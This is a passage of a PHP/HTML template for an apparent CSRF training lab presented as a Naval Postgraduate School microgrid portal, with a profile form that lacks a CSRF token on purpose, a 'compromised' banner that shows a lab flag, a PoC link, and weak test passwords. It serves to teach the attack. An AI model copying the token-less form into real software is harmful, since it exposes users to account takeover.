        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
        Edit Profile
      </a>
      <a href="/index.php?logout=1" class="nps-sidebar-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
        Sign Out
      </a>
    </div>
  </nav>

  <div class="nps-content">
    <div class="nps-page-title">Edit Profile</div>

    <?php if ($success): ?>
    <div class="nps-success-banner">✓ <?= esc($success) ?></div>
    <?php endif; ?>
    <?php if ($error): ?>
    <div class="nps-error" style="margin-bottom:16px;"><?= esc($error) ?></div>
    <?php endif; ?>

    <!-- ⚠ VULNERABLE form: no csrf_token, no hidden nonce — that's the bug -->
    <form method="POST" action="/index.php?action=profile">
      <div class="nps-form-card">
        <div class="nps-form-card-hdr"><h3>Account Information</h3></div>
        <div class="nps-form-body">
          <div class="nps-form-row">
            <div class="nps-form-field">
              <label>Username</label>
              <input type="text" name="username" value="<?= esc($currentUser['username']) ?>" required>
            </div>
            <div class="nps-form-field">
              <label>Email Address</label>
              <input type="email" name="email" value="<?= esc($currentUser['email']) ?>" required>
            </div>
          </div>
          <div class="nps-form-row">
            <div class="nps-form-field">
              <label>First Name</label>
              <input type="text" name="first_name" value="<?= esc($currentUser['first_name']) ?>">
            </div>
            <div class="nps-form-field">
              <label>Last Name</label>
              <input type="text" name="last_name" value="<?= esc($currentUser['last_name']) ?>">
            </div>
          </div>
          <div class="nps-form-row">
            <div class="nps-form-field">
              <label>New Password</label>
              <input type="password" name="password" placeholder="Leave blank to keep current">
            </div>
            <div class="nps-form-field">
              <label>Confirm Password</label>
              <input type="password" name="cpassword" placeholder="Repeat new password">
            </div>
          </div>
          <div class="nps-vuln-note">
            ⚠ Notice: This form does <strong>not</strong> include a CSRF token. Any cross-origin
            POST with valid field names will be accepted by the server.
          </div>
        </div>
        <div class="nps-form-footer">
          <button type="submit" name="save" value="Save" class="nps-btn-save">Save Changes</button>
          <a href="/index.php?action=dashboard" class="nps-btn-cancel-a">Cancel</a>
          <span style="margin-left:auto;font-size:.65rem;color:#aaa;">No CSRF token in this form</span>
        </div>
      </div>
    </form>
  </div>
</div>

<?php elseif ($currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     DASHBOARD
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="nps-classbar">UNCLASSIFIED // FOR OFFICIAL USE ONLY</div>
<header class="nps-topbar">
  <svg class="nps-crest" viewBox="0 0 48 48" fill="none">
    <rect width="48" height="48" rx="4" fill="#1B3A5C"/>
    <polygon points="24,6 42,42 6,42" fill="none" stroke="#CFB87C" stroke-width="2"/>
    <circle cx="24" cy="28" r="7" fill="none" stroke="#CFB87C" stroke-width="1.5"/>
    <text x="24" y="32" text-anchor="middle" font-size="8" fill="#CFB87C" font-weight="bold" font-family="Arial">NPS</text>
  </svg>
  <div class="nps-titles">
    <div class="nps-title-main">Naval Postgraduate School</div>
    <div class="nps-title-sub">Microgrid Management Portal · Monterey, CA</div>
  </div>
  <div class="nps-topbar-right">
    <a href="/index.php?action=profile"><?= esc($currentUser['username']) ?></a>
    <a href="/index.php?logout=1">Sign Out</a>
  </div>
</header>
<div class="nps-subbar">
  <a href="/index.php?action=dashboard" class="nps-subnav-link active">Dashboard</a>
  <a href="#" class="nps-subnav-link">Grid Reports</a>
  <a href="#" class="nps-subnav-link">Alerts</a>
  <a href="/index.php?action=profile" class="nps-subnav-link">My Profile</a>
</div>

<div class="nps-layout">
  <nav class="nps-sidebar">
    <div style="padding:0 16px 12px;">
      <div class="nps-sidebar-section">Main</div>
      <a href="/index.php?action=dashboard" class="nps-sidebar-link active">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
        Dashboard
      </a>
      <a href="#" class="nps-sidebar-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/></svg>
        Grid Reports
      </a>
      <a href="#" class="nps-sidebar-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/></svg>
        Alerts <span style="background:#b91c1c;color:#fff;border-radius:10px;font-size:.55rem;font-weight:700;padding:1px 5px;margin-left:4px;">3</span>
      </a>
      <div class="nps-sidebar-section" style="margin-top:12px;">Account</div>
      <a href="/index.php?action=profile" class="nps-sidebar-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
        Edit Profile
      </a>
      <a href="/index.php?logout=1" class="nps-sidebar-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
        Sign Out
      </a>
    </div>
  </nav>

  <div class="nps-content">
    <div class="nps-page-title">Microgrid Dashboard</div>

    <?php if ($isCompromised): ?>
    <!-- ACCOUNT COMPROMISED banner — shown after CSRF changes the email -->
    <div class="nps-alert-critical">
      <div class="nps-alert-critical-icon">🚨</div>
      <div class="nps-alert-critical-body">
        <h4>ACCOUNT COMPROMISED — CSRF Attack Successful</h4>
        <p>
          Your profile was modified cross-origin without your consent.<br>
          Username → <strong><?= esc($currentUser['username']) ?></strong> &nbsp;|&nbsp;
          Email → <strong><?= esc($currentUser['email']) ?></strong><br>
          The attacker can now request a password reset to <strong><?= esc($currentUser['email']) ?></strong>
          and gain full access to this account.
        </p>
        <div class="nps-flag-box"><?= LAB_FLAG ?></div>
      </div>
    </div>
    <?php endif; ?>

    <!-- Profile strip -->
    <div class="nps-profile-strip">
      <div class="nps-avatar"><?= strtoupper(substr($currentUser['first_name'], 0, 1) . substr($currentUser['last_name'], 0, 1)) ?></div>
      <div class="nps-profile-info">
        <div class="nps-profile-name">
          <?= esc($currentUser['first_name']) ?> <?= esc($currentUser['last_name']) ?>
          <?php if ($isCompromised): ?>
          <span style="background:#fef2f2;color:#b91c1c;font-size:.6rem;font-weight:700;border:1px solid #fca5a5;border-radius:2px;padding:1px 6px;margin-left:6px;">HIJACKED</span>
          <?php endif; ?>
        </div>
        <div class="nps-profile-meta">
          @<?= $isCompromised ? '<span class="nps-compromised-val">' . esc($currentUser['username']) . '</span>' : esc($currentUser['username']) ?> ·
          <?= $isCompromised ? '<span class="nps-compromised-val">' . esc($currentUser['email']) . '</span>' : esc($currentUser['email']) ?> ·
          <?= esc($currentUser['role']) ?>
        </div>
      </div>
      <div class="nps-profile-right">
        <a href="/index.php?action=profile" class="nps-btn-sm nps-btn-outline-sm">Edit Profile</a>
        <a href="/index.php?attack=1" class="nps-btn-sm nps-btn-navy" style="text-decoration:none;">CSRF PoC</a>
      </div>
    </div>

    <!-- Grid status cards -->
    <div class="nps-grid-cards">
      <div class="nps-grid-card">
        <div class="nps-grid-card-label">Grid Load</div>
        <div class="nps-grid-card-val">847 <span style="font-size:.85rem;color:#888;">kW</span></div>
        <div class="nps-grid-card-sub">87% of capacity</div>
        <div class="nps-grid-card-bar"><div class="nps-grid-card-bar-fill" style="width:87%;background:#0A1628;"></div></div>
      </div>
      <div class="nps-grid-card">
        <div class="nps-grid-card-label">Battery Reserve</div>
        <div class="nps-grid-card-val">62 <span style="font-size:.85rem;color:#888;">%</span></div>
        <div class="nps-grid-card-sub">↑ Charging (14 kW)</div>
        <div class="nps-grid-card-bar"><div class="nps-grid-card-bar-fill" style="width:62%;background:#166534;"></div></div>
      </div>
      <div class="nps-grid-card">
        <div class="nps-grid-card-label">Solar Output</div>
        <div class="nps-grid-card-val">312 <span style="font-size:.85rem;color:#888;">kW</span></div>
        <div class="nps-grid-card-sub">↓ Cloudy conditions</div>
        <div class="nps-grid-card-bar"><div class="nps-grid-card-bar-fill" style="width:32%;background:#854d0e;"></div></div>
      </div>
      <div class="nps-grid-card">
        <div class="nps-grid-card-label">Active Alerts</div>
        <div class="nps-grid-card-val" style="color:#b91c1c;">3</div>
        <div class="nps-grid-card-sub">2 critical, 1 warning</div>
        <div class="nps-grid-card-bar"><div class="nps-grid-card-bar-fill" style="width:100%;background:#b91c1c;"></div></div>
      </div>
    </div>

    <!-- Alerts table -->
    <div class="nps-section-title">System Alerts</div>
    <table class="nps-table" style="margin-bottom:24px;">
      <thead>
        <tr>
          <th>Alert ID</th>
          <th>Timestamp</th>
          <th>System</th>
          <th>Description</th>
          <th>Severity</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>ALT-2024-0891</td>
          <td>Sep 11, 2024 20:46 UTC</td>
          <td>Inverter B-2</td>
          <td>DC bus voltage deviation detected (±3.2%)</td>
          <td><span class="nps-badge nps-badge-red">Critical</span></td>
        </tr>
        <tr>
          <td>ALT-2024-0890</td>
          <td>Sep 11, 2024 19:12 UTC</td>
          <td>Battery Bank A</td>
          <td>Cell temperature threshold exceeded (41°C)</td>
          <td><span class="nps-badge nps-badge-red">Critical</span></td>
        </tr>
        <tr>
          <td>ALT-2024-0887</td>
          <td>Sep 11, 2024 14:33 UTC</td>
          <td>Solar Array 3</td>
          <td>Output below expected due to cloud cover</td>
          <td><span class="nps-badge nps-badge-yellow">Warning</span></td>
        </tr>
        <tr>
          <td>ALT-2024-0885</td>
          <td>Sep 10, 2024 09:05 UTC</td>
          <td>Grid Tie Switch</td>
          <td>Scheduled maintenance completed — OK</td>
          <td><span class="nps-badge nps-badge-green">Resolved</span></td>
        </tr>
      </tbody>
    </table>

    <!-- Grid node table -->
    <div class="nps-section-title">Grid Nodes</div>
    <table class="nps-table">
      <thead>
        <tr><th>Node</th><th>Location</th><th>Load (kW)</th><th>Status</th><th>Operator</th></tr>
      </thead>
      <tbody>
        <tr><td>NODE-01</td><td>Herrmann Hall</td><td>142</td><td><span class="nps-badge nps-badge-green">Online</span></td><td>researcher_smith</td></tr>
        <tr><td>NODE-02</td><td>Spanagel Hall</td><td>218</td><td><span class="nps-badge nps-badge-green">Online</span></td><td>j.chen</td></tr>
        <tr><td>NODE-03</td><td>King Hall</td><td>97</td><td><span class="nps-badge nps-badge-yellow">Degraded</span></td><td>researcher_smith</td></tr>
        <tr><td>NODE-04</td><td>Root Hall</td><td>390</td><td><span class="nps-badge nps-badge-green">Online</span></td><td>k.watanabe</td></tr>
      </tbody>
    </table>
  </div>
</div>

<?php else: ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     LOGIN PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="nps-login-bg">
  <div class="nps-classbar">UNCLASSIFIED // FOR OFFICIAL USE ONLY</div>
  <div class="nps-login-body">
    <div style="width:100%;max-width:400px;">
      <div class="nps-login-card">
        <div class="nps-login-card-hdr">
          <svg class="nps-crest" viewBox="0 0 48 48" fill="none">
            <rect width="48" height="48" rx="4" fill="#0A1628"/>
            <polygon points="24,6 42,42 6,42" fill="none" stroke="#CFB87C" stroke-width="2"/>
            <circle cx="24" cy="28" r="7" fill="none" stroke="#CFB87C" stroke-width="1.5"/>
            <text x="24" y="32" text-anchor="middle" font-size="8" fill="#CFB87C" font-weight="bold" font-family="Arial">NPS</text>
          </svg>
          <div>
            <div class="nps-login-hdr-text">NPS Microgrid Portal</div>
            <div style="font-size:.6rem;color:rgba(255,255,255,.4);margin-top:1px;text-transform:uppercase;letter-spacing:.05em;">Naval Postgraduate School · Monterey, CA</div>
          </div>
        </div>
        <div class="nps-login-body-inner">
          <div class="nps-login-title">Sign In</div>
          <div class="nps-login-sub">Use your NPS network credentials to access the portal.</div>

          <?php if ($error): ?>
          <div class="nps-error"><?= esc($error) ?></div>
          <?php endif; ?>

          <form method="POST" action="/index.php">
            <div class="nps-field">
              <label>Email Address</label>
              <input type="email" name="email" placeholder="you@nps.edu" required autocomplete="email">
            </div>
            <div class="nps-field">
              <label>Password</label>
              <input type="password" name="password" placeholder="NPS network password" required autocomplete="current-password">
            </div>
            <button type="submit" class="nps-btn-primary">Sign In</button>
          </form>

          <div style="background:#f0f0f0;border:1px solid #ddd;border-radius:4px;padding:10px 12px;margin-top:14px;font-size:11px;">
            <div style="font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#888;margin-bottom:8px;">📋 Test Accounts</div>
            <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #e0e0e0;"><span style="color:#555;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">chen@nps.edu</span><span style="font-family:monospace;font-weight:700;color:#0A1628;font-size:11px;white-space:nowrap;">chen@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#dbeafe;color:#1d4ed8;white-space:nowrap;">Researcher</span></div>
            <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #e0e0e0;"><span style="color:#555;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">park@nps.edu</span><span style="font-family:monospace;font-weight:700;color:#0A1628;font-size:11px;white-space:nowrap;">park@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#dbeafe;color:#1d4ed8;white-space:nowrap;">Researcher</span></div>
            <div style="display:flex;align-items:center;gap:7px;padding:3px 0;"><span style="color:#555;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">torres@nps.edu</span><span style="font-family:monospace;font-weight:700;color:#0A1628;font-size:11px;white-space:nowrap;">torres@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#dbeafe;color:#1d4ed8;white-space:nowrap;">Researcher</span></div>
          </div>
        </div>
        <div class="nps-login-footer">
          Use of this system constitutes consent to monitoring.<br>
          Unauthorized access is a violation of U.S. law (18 U.S.C. § 1030).<br>
          For access issues contact <a href="mailto:microgrid@nps.edu" style="color:#888;">microgrid@nps.edu</a>
        </div>
      </div>
      <div style="text-align:center;margin-top:14px;font-size:.62rem;color:rgba(255,255,255,.25);">
        UNCLASSIFIED // FOR OFFICIAL USE ONLY · Naval Postgraduate School · © 2024
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

</body>
</html>
